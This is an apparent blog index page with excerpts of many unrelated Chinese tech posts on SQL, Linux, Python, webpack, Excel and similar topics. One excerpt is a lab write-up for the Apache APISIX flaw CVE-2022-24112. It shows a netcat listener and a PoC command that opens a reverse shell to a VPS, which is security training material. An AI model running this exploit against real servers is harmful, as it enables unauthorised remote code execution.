PS C:\Users\Administrator&gt; pip install matplotlib WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', TimeoutError('_ssl.c:980: The handshake operation timed out'))': /simple/matplotlib/ WARNING: Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', TimeoutError('_ssl.c:980: The handshake operation timed out'))': /simple/matplotlib/ WARNING: Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6c0920b430bb0c683d01afcfc960519/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/046e6407e65a877dedcffed6a321892c/" rel="bookmark">
			SQL Server 中给字段设置默认值的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 在创建表的时候创建默认值
if object_id('T','U') is not null drop table T GO create table T ( ID int , Name varchar(20) , LoginTime datetime default getdate() ) go insert into T (ID,Name) VALUES (1,'Miya') ,(2,'Coco') go select * from T 查询结果如下：
2. 对已经有的字段设置默认值
if object_id('T','U') is not null drop table T GO create table T ( ID int , Name varchar(20) , LoginTime datetime ) go --增加约束 ALTER TABLE T ADD CONSTRAINT T_LoginTime DEFAULT (getdate()) FOR LoginTime GO insert into T (ID,Name) VALUES (1,'Miya') ,(2,'Coco') go select * from T 查询结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/046e6407e65a877dedcffed6a321892c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/809db1f1e71610f71188f8e50bdc413f/" rel="bookmark">
			ping命令的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ping命令的使用
windows:
输入—&gt;ipconfig,会显示ip地址
ipconfig/all----&gt;可以看到mac地址
linux:
ip add 查看ip地址
ip nei / ip route 看的是路由表
ping命令在windows中的使用:
cmd-命令里使用
ping www.baidu.com 默认情况下只发四个包 接个-t选项 就会一直ping ctrl + c 结束
ping命令在linux中的使用:
在linux里边ping命令是一直执行的，我们要是想让它ping 4 个包，那就在命令后边加上 -c 4
ping www.baidu.com -c 4
-c count 数量
-W timeout 超时—》超过多长时间就不接受了
-w deadline 截止时间—》设置一个固定的时间为截止时间，感觉比W好用
-s 指定ping包数据的大小
————————
ping命令是用来测试网络的连通性以及质量的，如果过程中一直丢包，那质量是何其差
-s 是考验抗压能力
ping www.baidu.com -s 1000 看一个小时是否丢包 看网络是否稳定 如果丢包率是0，说明网络质量贼好
即ping命令的作用：
1、测试网络的连通性
2、测试网络的质量：丢包率，响应时间长短 越短越好
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e80e91843f1981a72990aecfbd7ad540/" rel="bookmark">
			RTMP推流，WebRTC拉流步骤及问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.下载VirtualBox虚拟机，Centos7镜像文件以及配置详情请点击链接
VirtualBox虚拟机下载安装及配置CentOS7_随风散-&gt;拉萨的博客-CSDN博客
虚拟机中RTMP推流，WebRTC拉流相关命令
2.启动进去后输入账号，账号默认为root,然后输入密码
若出现【root@bogon~】，可以输入命令：
hostname localhost
su
正常输入账号密码为
3.下载源码
git clone -b 4.0release https://gitee.com/ossrs/srs.git
Note:若出现bash: git: command not found,要先在虚拟机中安装git插件
安装git命令：yum install -y git
4.编译，注意需要切换到srs/trunk目录：
cd srs/trunk
./configure
make
5.启动服务器
启动服务器之前先关闭虚拟机防火墙
暂时关闭防火墙命令：systemctl stop firewalld
然后使用vim命令编辑srs.conf文件
安装vim相关的软件包命令：yum install -y vim*
cd conf #进入conf目录
vim srs.conf #编辑srs.conf文件
i #进入编辑模式
修改rtmp_to_rtc off为rtmp_to_rtc on
esc #退出编辑模式
：wq #保持并退出vim
./objs/srs -c conf/srs.conf
检查SRS是否成功启动，可以打开 http://localhost:8080/ ，或者执行命令：
# 查看SRS的状态
./etc/init.d/srs status
# 或者看SRS的日志
tail -n 30 -f .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e80e91843f1981a72990aecfbd7ad540/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c9ff35ce59f90c2e91ec26127f0d6ee/" rel="bookmark">
			春秋云境：CVE-2022-24112
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		春秋云境：CVE-2022-24112 文章合集：春秋云境系列靶场记录（合集）
Apache APISIX batch-requests SSRF RCE 漏洞：CVE-2022-24112 漏洞介绍 Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。
解题步骤 题外话
这个漏洞做费了些事，因为开始不懂这个漏洞到底什么意思，最后参考了很多篇文章，才算是明白，这里附上我参考的几篇文章：
1、https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md
2、星阑实验室-【技术干货】CVE-2022-24112 Apache APISIX 远程代码执行漏洞：https://mp.weixin.qq.com/s/S75GkwmsaTggBxcX05GY5Q
3、长白山攻防实验室-Apache APISIX Dashboard（CVE-2022-24112）命令执行漏洞方式利用：https://mp.weixin.qq.com/s/rfN_BtCuwVCS90jwCoA48g
4、https://github.com/twseptian/cve-2022-24112
参考网上的两位师傅的POC，针对春秋云境靶场稍做了修改，修改后的POC放这了：https://github.com/Acczdy/CVE-2022-24112_POC，有需要可以自己下载，或者可以直接参考上面的POC，进入正题：
访问URL，得到的是404页面
直接使用工具进行反弹shell
VPS开启监听：nc -lvvp 18888
此处使用的是我修改的在Linux环境中适用的脚本，也有Windows环境使用的，有需要自己可以下载，进入脚本目录，参照下面格式进行运行：
python3 CVE-2022-24112_Linux_by_twseptian.py -t eci-eninecsteC2zon6q0xod9n5r7me4ih.cloudeci1.ichunqiu.com:9080 -L VPS_IP -P VPS_PODRPODR
返回VPS查看获取flag
文章合集：春秋云境系列靶场记录（合集）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71a29cacfc17bea4bf280d3c51bc7eae/" rel="bookmark">
			springboot&#43;mybatisplus实现分页
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常开发中，多记录的列表查询可能会遇到分页处理的场景，在springboot项目中传统是引入mybatis组件进行持久化，然后通过pagehelper组件进行分页实现。下面体验一下在springboot项目中引入mybatisplus组件，通过其自带分页插件实现分页功能。
1、MyBatis Plus MyBatis Plus是一个MyBatis的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。
Mybatis Plus可以节省大量时间，所有的CRUD代码都可以自动化完成。MyBatis Plus自带分页插件（即BaseMapper接口中的selectPage()方法），只要简单的配置即可实现分页功能。
2、springboot+mybatisplus+mysql实例 pom.xml文件中引入依赖
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;dynamic-datasource-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; 添加分页配置类
@Configuration public class MybatisPlusConfig { /** * 分页插件（官网最新） */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; } } 添加service层代码，分页的所有数据都在userPage对象中封装着，所以可以调用userPage对象的一系列方法对分页数据进行操作。
@Slf4j @Service public class SysUserServiceImpl implements SysUserService { @Autowired private SysUserMapper userMapper; @Override public Page&lt;User&gt; listPage1(Page&lt;User&gt; page, QueryWrapper&lt;User&gt; queryWrapper) { return userMapper.selectPage(page, queryWrapper); } @Override public PagerModel&lt;User&gt; listPage2(Page&lt;User&gt; page, QueryWrapper&lt;User&gt; queryWrapper) { Page&lt;User&gt; userIPage = userMapper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71a29cacfc17bea4bf280d3c51bc7eae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0474cfec6701053f5a374ded731a220e/" rel="bookmark">
			禅道二次开发（三）：二次开发实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对禅道框架有初步的了解后就可以开始进行二次开发了，不需要完全搞懂zentaoPHP框架，可以在开发过程中学习。本文记录一下我进行禅道二次开发的其中一个小功能的实现过程。
注：本文基于禅道开源版16.4进行二次开发，禅道16.5+版本升级了扩展机制，具体请参考官方文档：https://devel.easycorp.cn/book/extension-new/intro-52.html 。
目录 新建用例页面扩展1. 定位扩展模块2. view 扩展覆盖扩展 3. lang扩展4. control方法扩展5. model方法扩展覆盖扩展钩子扩展 用例浏览页面扩展用例编辑页面扩展view方法钩子扩展js/css/lang/config 扩展 对禅道进行扩展主要在module目录下进行，在需要扩展的模块下对model、control、view方法以及css、js、lang等进行扩展。下面介绍如何在用例模块中新增一个字段，了解禅道是如何进行扩展的。
需求是对测试用例新增字段【测试方式】，选项为手工或者自动化，新建用例页面的效果如下：
下面介绍具体扩展步骤。
新建用例页面扩展 对禅道的二次开发一般在对应模块下的 ext 目录中进行扩展，不需要对禅道源码进行修改。先来介绍新建用例页面新增【测试方式】字段的步骤。
1. 定位扩展模块 第一步需要定位到要扩展页面的模块名和方法名。
点击进入新建用例页面，可以看到URL地址为：http://192.168.30.9:8080/zentao/testcase-create-1-all-0.html 。
通过URL地址可以得到如下信息：
模块名为testcase方法名为create，可以在\module\testcase\control.php 中找到create方法。\module\testcase\model.php 文件中存放control可以调用的Model方法。对应的view模板文件为 \module\testcase\view\create.html.php。后面的1-all-0是create方法的参数，这里的1表示产品ID，具体含义需要查看代码。 通过这个URL我们知道要扩展testcase模块下的create方法。
2. view 扩展 对 view 方法的扩展有两种方式：覆盖扩展和钩子扩展。
覆盖扩展 覆盖扩展就是对原来的方法进行重写，直接在 \module\testcase\ext\view 目录下创建与要扩展方法同名的文件 create.html.php，复制 \module\testcase\view 目录下 create.html.php 代码，新增【测试方式】相关前端代码。下面直接给出代码（部分关键代码）：
&lt;td&gt; &lt;div class='table-row'&gt; &lt;div class='table-col' id='stageBox'&gt; &lt;div class='input-group'&gt; &lt;span class='input-group-addon w-80px'&gt;&lt;?php echo $lang-&gt;testcase-&gt;stage;?&gt;&lt;/span&gt; &lt;?php echo html::select('stage[]', $lang-&gt;testcase-&gt;stageList, $stage, "class='form-control chosen' multiple='multiple'");?&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class='table-col' id='exectypeBox'&gt; &lt;div class='input-group'&gt; &lt;span class='input-group-addon fix-border'&gt;&lt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0474cfec6701053f5a374ded731a220e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e7e2ff3fbe5336f0ff61f0290692558/" rel="bookmark">
			linux服务管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.service
用法：service 服务名 start/stop/restart
实例：
重启网络服务：
#service network retart
关闭ftp服务：
#service vsftpd stop
打开httpd服务
#service httpd start
2.chkconfig
功能：能够为不同的系统级别设置不同的服务
实例：
查看系统服务设定
[root@localhost xinetd.d]# chkconfig --list
sendmail 0:关闭 1:关闭 2:打开 3:打开 4:打开 5:打开 6:关闭
snmptrapd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭
gpm 0:关闭 1:关闭 2:打开 3:打开 4:打开 5:打开 6:关闭
syslog 0:关闭 1:关闭 2:打开 3:打开 4:打开 5:打开 6:关闭
...
将指定级别的某个系统服务配置为指定状态 (打开/关闭)
[root@localhost xinetd.d]# chkconfig --list|grep ntpd
ntpd 0:关闭 1:关闭 2 关闭 3:关闭 4:关闭 5:关闭 6:关闭
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e7e2ff3fbe5336f0ff61f0290692558/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5217052715c5868d1dae05c0e63bee75/" rel="bookmark">
			【linux】查看Linux系统版本信息的几种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、查看Linux内核版本命令（两种方法）：
1、cat /proc/version
2、uname -a
二、查看Linux系统版本的命令（3种方法）：
1、lsb_release -a，即可列出所有版本信息：
这个命令适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版。
2、cat /etc/redhat-release，这种方法只适合Redhat系的Linux：
[root@S-CentOS home]# cat /etc/redhat-release
CentOS release 6.5 (Final)
3、cat /etc/issue，此命令也适用于所有的Linux发行版。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/beca2f5a7af7fa8818e3895806cc581c/" rel="bookmark">
			【面试题】2023年前端最新面试题-webpack篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文见：语雀（https://www.yuque.com/deepstates/interview/dcl9yb）
● 脚手架与项目脚本
● 构建工具
○ webpack
○ grunt、gulp
脚手架
架构
如何设计突发大规模并发架构？
框架
知道各种JS框架(Angular, Backbone, Ember, React, Meteor, Knockout…)么? 能讲出他们各自的优点和缺点么?
构建工具
webpack
⭐️ 相关知识点参考：
如何设计代码依赖
webpack是解决什么问题而生的?
如果像以前开发时一个html文件可能会引用十几个js文件,而且顺序还不能乱，因为它们存在依赖关系，同时对于ES6+等新的语法，less, sass等CSS预处理都不能很好的解决……，此时就需要一个处理这些问题的工具。
前端为什么要进行打包和构建？
● 代码层面：体积更小（Tree-shaking、压缩、合并），加载更快编译高级语言和语法（TS、ES6、模块化、scss）、兼容性和错误检查（polyfill,postcss,eslint）
● 研发流程层面：统一、高效的开发环境，统一的构建流程，产出标准集成公司构建规范（提测、上线）
术语
什么是module，什么是chunk，什么是bundle？
● module：是开发中的单个模块
● chunk：是指webpack在进行模块依赖分析的时候，代码分割出来的代码块
● bundle：是由webpack打包出来的文件
原理
webpack打包原理? / webpack工作原理？（字节）/ webpack原理（数字马力）
一、webpack可以看做是模块打包机：
● 根据文件间的依赖关系对其进行静态分析，
● 然后将这些模块按指定规则生成静态资源，
● 当 webpack 处理程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。
webpack打包过程？/webpack 的构建流程是什么?
● 初始化参数：解析webpack配置参数，合并shell传入和webpack.config.js文件配置的参数，形成最后的配置结果。
● 开始编译：上一步得到的参数初始化compiler对象，注册所有配置的插件，插件监听webpack构建生命周期的事件节点，做出相应的反应，执行对象的run方法开始执行编译，生成compilation对象
● 确定入口：从配置的entry入口，开始解析文件构建AST语法树，找出依赖，递归下去。
● 编译模块：递归中根据文件类型和loader配置，调用所有配置的loader对文本进行转换，再找出该模块依赖的模块，再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理。
● 完成模块编译并输出：递归完事后，得到每个文件结果，包含每个模块以及他们之间的依赖关系，根据entry或分配置生成代码块chunk
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/beca2f5a7af7fa8818e3895806cc581c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/852832254dda69b6ed416601f04ef683/" rel="bookmark">
			CV【3】：drop_out &amp; drop_path
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言1. drop_out1.1. 出现的原因1.2. 概念1.3. 工作原理1.4. 尺度匹配问题1.5. 有效缓解过拟合的原因1.6. 代码实现 2. drop_path2.1. 与 drop_out 的差异2.2. 工作原理2.3. 在网络中的应用2.4. 代码实现 前言 本文主要对比了两种正则化方法：drop_out 和 drop_path
1. drop_out 1.1. 出现的原因 在机器学习的模型中，如果模型的参数太多，而训练样本又太少，训练出来的模型很容易产生过拟合的现象。在训练神经网络的时候经常会遇到过拟合的问题，过拟合具体表现在：模型在训练数据上损失函数较小，预测准确率较高；但是在测试数据上损失函数比较大，预测准确率较低。
过拟合是很多机器学习的通病。如果模型过拟合，那么得到的模型几乎不能用。为了解决过拟合问题，一般会采用模型集成的方法，即训练多个模型进行组合。此时，训练模型费时就成为一个很大的问题，不仅训练多个模型费时，测试多个模型也是很费时。
正则化可以有效地缓解上述两个问题
1.2. 概念 drop_out 是作为缓解卷积神经网络CNN过拟合而被提出的一种正则化方法，也叫做随机失活。
drop_out 可以作为训练深度神经网络的一种 trick 供选择。在每个训练批次中，通过忽略一半的特征检测器（让一半的隐层节点值为 0），可以明显地减少过拟合现象。这种方式可以减少特征检测器（隐层节点）间的相互作用，检测器相互作用是指某些检测器依赖其他检测器才能发挥作用。
简单来说就是在模型训练阶段的前向传播过程中，让某些神经元的激活值以一定的概率停止工作。
drop_out 确实能够有效缓解过拟合现象的发生，但是可能会减缓模型收敛的速度，因为每次迭代只有一部分参数更新，可能导致梯度下降变慢。
1.3. 工作原理 通过一个三层的简单神经网络来介绍 drop_out的工作原理，输入是 X X X，输出是 Y Y Y。正常的训练流程是首先把输入X通过网络进行前向传播，然后把误差反向传播以决定如何更新参数。
遍历神经网络的每一层节点，设置节点保留概率 keep_prob，即该层的节点有 keep_prob 的概率被保留，keep_prob 的取值范围在 0 到 1 之间，假设 keep_prob = 0.5 通过设置神经网络该层节点的保留概率，使得神经网络不会去偏向于某一个节点（因为该节点有可能被删除），从而使得每一个节点的权重不会过大，来减轻神经网络的过拟合 删除神经网络的节点，并删除网络与移除节点之间的连接
输入样本，使用简化后的网络进行训练 让输入 X X X 通过部分神经元失活的新网络（如上右图）进行前向传播，然后计算损失并把损失反向传播，一小批样本执行完这个过程后，根据梯度下降算法更新参数 不断重复这一过程： 恢复失活的神经元重新让所有神经元以一定概率 p 失活（这次失活的和上次失活的神经元并不一定相同）让输入通过部分神经元失活的新网络进行前向传播，然后计算损失并把损失反向传播，新的一批样本执行完这个过程后，根据梯度下降算法更新参数 需要注意的是，drop_out 一般只在网络的训练阶段使用，而测试阶段不使用drop_out。这是因为如果在测试阶段使用 drop_out 可能会导致预测值产生随机变化（因为 drop_out 使节点随机失活）。而且，在训练阶段已经将权重参数除以 keep_prob 来保证输出的期望值不变，所以在测试阶段没必要再使用 drop_out
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/852832254dda69b6ed416601f04ef683/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4196d13fa57b93a6d5e9fe5d5e9a436b/" rel="bookmark">
			docker快速安装Oracle11g
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.下载镜像 docker pull registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g
2.创建快速搭建脚本build.sh
#!/bin/bash
#启动镜像
containId=`docker ps -a |grep -i oracle11g|awk '{print $1}'`
FDIR=$(dirname $(readlink -f "$0"))
if [[ ! $containId ]] ;then
echo "target container not exist!"
else
echo "target container exist , ID = "$containId
docker stop $containId
docker rm $containId
echo "success delete container "$containId
fi
docker run -d -p 1521:1521 -v $FDIR/data/oracle:/data/oracle --name oracle11g --restart always registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g
sleep 3
docker logs -f --tail 100 oracle11g
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4196d13fa57b93a6d5e9fe5d5e9a436b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0220f79fc8f406fbdfdbb417dacbc145/" rel="bookmark">
			websocket心跳及重连机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		React中项目需要使用websockt的重连机制
useEffect(() =&gt; { let webSocket = null; let lockReconnect = false; // 是否真正建立连接 let timeout = 20 * 1000; // 20秒一次心跳，可更改实际需求需要的时间 let timeoutObj = null; let serverTimeoutObj = null; let timeoutNum = null; const start = () =&gt; { // 开启心跳 timeoutObj &amp;&amp; clearTimeout(timeoutObj); // serverTimeoutObj &amp;&amp; clearTimeout(serverTimeoutObj); timeoutObj = setTimeout(function () { if (webSocket.readyState === 1) {//连接正常 webSocket.send('hello'); } else { reconnect(); } // serverTimeoutObj = setTimeout(function () { // // 超时关闭 // webSocket.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0220f79fc8f406fbdfdbb417dacbc145/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12ce2ce29c63a052704066d969fb0222/" rel="bookmark">
			linux系统下如何获取文件的创建时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux 获取文件的创建时间 提到获取文件的创建时间，写Java的小伙伴可能会说，那太简单了，java.nio.file.attribute.BasicFileAttributes下这个类不就记录了文件的相关信息吗，比如下面这段代码不就得到文件的创建时间了嘛！
@Test public void getCreateTime () { File file = new File("d://aaa.txt"); BasicFileAttributes attr = null; long fileCreateTime = 0L; try { Path path = file.toPath(); attr = Files.readAttributes(path, BasicFileAttributes.class); fileCreateTime = attr.creationTime().toMillis(); } catch (Exception e) { logger.info("", e); } org.joda.time.DateTime dateTime = new DateTime(fileCreateTime); String createTimeStr = dateTime.toString("yyy-MM-dd HH:mm:ss"); System.out.println(createTimeStr); } 2022-12-20 13:12:15 但是查看这个问题的小伙伴可能也已经发现了，该方法在windows系统下可以精准获取到文件的创建时间，但是在linux系统下就获取不到了，拿到的时间不再是文件创建的时间了。
这里先贴出答案，亲测有效。
前置条件：文件存储的文件系统类型必须为 ext4
查看文件系统的类型：df -T
root@firefly:/data# df -T Filesystem Type 1K-blocks Used Available Use% Mounted on udev devtmpfs 1962992 0 1962992 0% /dev tmpfs tmpfs 1969212 12056 1957156 1% /dev/shm tmpfs tmpfs 5120 4 5116 1% /run/lock tmpfs tmpfs 1969212 0 1969212 0% /sys/fs/cgroup /dev/nvme0n1p1 ext4 983456156 20055680 913373932 3% /data 可以到 /data 目录(你要查看的文件所在的文件系统，这里我的文件是在这个下面的)对应的文件系统类型是ext4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12ce2ce29c63a052704066d969fb0222/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df09c9a226f4650cbf11273fa0d065ba/" rel="bookmark">
			excel日期函数：DATEDIF的几个实际应用公式编写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DATEDIF函数不仅可以用来计算年龄、工龄、工龄工资、项目周期，还可以用来做生日倒计时提醒，项目竣工日倒计时提醒等等。用上它，您再也不会缺席那些重要的日子，不论是亲人生日、项目竣工日，还是儿女的毕业典礼日。
DATEDIF函数和我们平时见到的函数有所不同。大家都知道，一般我们只要在EXCEL中输入函数字母的前几位，EXCEL就会自动弹出该函数，然而这个函数字母都输完了，EXCEL仍没有任何提示。有的小伙伴可能都会怀疑是否有这个函数。其实DATEDIF函数是EXCEL隐藏函数，在帮助和插入公式里面是没有的，只能纯手工输入。
DATEDIF函数不仅可以用来计算年龄、工龄、工龄工资、项目周期，还可以用来做生日倒计时提醒，项目竣工日倒计时提醒等等。下面我们就来认识认识它。
一、 初识DATEDIF
DATEDIF函数用于计算两日期之差，返回两个日期之间的年、月、日间隔数
函数结构：DATEDIF（起始日期,结束日期,返回类型）
1.参数解释：
1）起始日期和结束日期
起始日期、结束日期作为需要计算差异的两个日期。
这两个日期的输入方法如下：
可以直接输入带引号的日期，例如"2017/10/16"。注意起始日期不能早于1900年，结束日期要大于起始日期。
也可以直接引用单元格中的日期
还可以利用其他函数得到，例如TODAY() （注意：范例当日是2019年2月15日）
2）返回类型
返回类型用于设置结算结果的类型。返回类型是文本，输入时须要带双引号。
y：返回两个日期之间相差整年数（不足一年的不计）
m：返回两个日期之间相差整月数（不足一月的不计）
d：返回两个日期之间相差的天数
ym：计算两日期之间略去整年差异后的整月数差异。譬如，两个日期（2017-4-20,2019-2-20）相差1年10月，略去整年差异1年，则ym的结果就是10月。再譬如，两个日期（2018-4-20,2019-2-20）相差10月，则ym的结果是10月。
yd：计算两日期之间略去整年差异后的天数差异。譬如，两个日期（2017-4-20,2019-2-20）相差1年零306天，略去整年差异1年，则ym的结果就是306天。
md：计算两日期之间略去整年和整月差异后的天数差异。譬如，两个日期（2017-4-20,2019-2-25）相差1年10月零5天，略去整年和整月差异1年10月，则md的结果就是5天。
2.举个栗子
DATEDIF("2017/2/15","2019/2/15","y")，计算"2017/2/15"与"2019/2/15"之间相差几个整年。这里相差两个完整的年，所以等于2。
DATEDIF("2017/1/6","2019/2/15","d")，计算"2017/1/6"与"2019/2/15"之间相差的天数，等于770。
DATEDIF("2017/1/6","2019/2/15","ym")，计算两日期之间除开整年外的间隔月数。两日期之间实际相差25月，包含了2个整年（24月），所以ym类型返回值为25-24=1。
DATEDIF("2017/1/6","2019/2/15","yd")，计算两日期之间除开整年外的间隔天数。两日期之间实际相差770天，包含了2个整年（730天），所以yd类型返回值为770-730=40。
3.使用要点
1）双引号
到这里，相信小伙伴们对于DATEDIF函数已经有了初步的认识，可以写几个公式练练手啦。写公式中需注意双引号的使用。
（1）如果第1、2参数是直接输入日期，则日期必须带双引号。
（2）第3参数是文本，一定要记得带上双引号。
2）错误类型
DATEDIF函数如果发生错误，通常有以下三类：
二、DATEDIF函数实际应用例举
1.根据出生日期计算年龄
已知下面员工的出生日期，求他们今年的年龄。
公式：=DATEDIF(D2,TODAY(),"y")
TODAY()函数获取的是系统当前日期，列举的实例为2019/2/15日的计算结果，并不一定和小伙伴们得到的结果相符哦~
怎么样？是不是很简单呢？
2.根据身份证号码计算年龄
上一例中已经有了出生日期，所以直接用DATEDIF函数套用TODAY函数即可计算出年龄。如果只有身份证号码，要计算年龄，就需要把出生日期从身份证号码中提取出来后再计算。公式如下：
公式解析：
使用MID函数提取出身份证号码中出生日期的8位数字。
用TEXT函数让这8位数字以"0-00-00"的格式显示，得到像日期格式的文本，然后在TEXT函数前加上负负得正的运算，将文本转换为日期。
最后将上面得到的日期作为DATEDIF函数的起始日期，将TODAY()作为结束日期，设置返回类型为“y”,即可计算出两日期之间相差的整年数——年龄。
3.根据入职日期计算员工工龄（以年月日的形式展现）
用例1计算年龄的方法，如果知道员工入职的时间，即可计算出按整年计的员工工龄。但如果需要计算出详细的员工工龄，如多少年多少月多少天，该怎么做呢？答案如下：
公式虽长，却特别好理解。首先用三个DATEDIF函数分别计算出两日期之间相差几年几月几日，最后再用文本连接符“&amp;”进行连接，得到结果。
4.计算工龄工资
根据2019年国家出台的工龄工资规定，员工连续工作满一年 50元/月；连续工作满两年 100元/月；连续工作满三年 150元/月；连续工作满四年180元/月，以此类推，累计十年封顶。
小伙伴是不是一头雾水呢？没事，我们一步一步来，首先计算工龄（按整年计算）。
公式：=DATEDIF(C2,D2,"y")
接着，来到我们的重头戏，计算工龄工资。
这里我们借助了IF函数和MIN函数。
根据2019年国家出台的工龄工资规定，1-3年工龄工资每年是以50来递增的，4-10年的工龄工资每年是以30来递增的。我们可以使用IF函数分开判断。
首先判断工龄E2是否小于4，小于4则表示员工工龄工资是以每年50来递增，返回“50*E2”的结果；如果工龄E2不小于4，工龄工资则是在150的基础上以每年30来递增，返回“150+30*(MIN(10，E2)-3)”的结果。
因为工龄工资只能累计十年，大于十年的工龄工资与十年的工龄工资一致，所有我们使用MIN函数返回10和E2中的最小值作为工龄。
5.制作员工生日提醒
下面是一张员工的信息表，我们想做一个生日提醒，提前7天提醒某员工的生日快到了。
提示：和IF函数结合使用，快开动脑筋想一想吧~
公式：=IF(DATEIF(D3-7,TODAY(),"yd")
是不是感觉这个公式很烧脑？
我们日常计算距离生日的天数都是用即将到来的生日日期减去今天的日期。而这个公式与我们的习惯不同，它用今天的日期减去出生日期进行计算，并且还将出生日期减少了7天。
为何能这样做？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df09c9a226f4650cbf11273fa0d065ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b5c6a6b6cc365a762e04de6cdff03f4/" rel="bookmark">
			Python绘图——matplotlib
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 导入包
import matplotlib.pyplot as plt 2. 基本绘图
（1）折线图
plt.plot(x,y) 3. 图像美化
（1）画布设置
# 设置画面大小 plt.figure(figsize=(6, 6.5)) # 设置图片分辨率 plt.rcParams['figure.dpi'] = 300 （2）手动设置坐标轴刻度间隔以及刻度范围
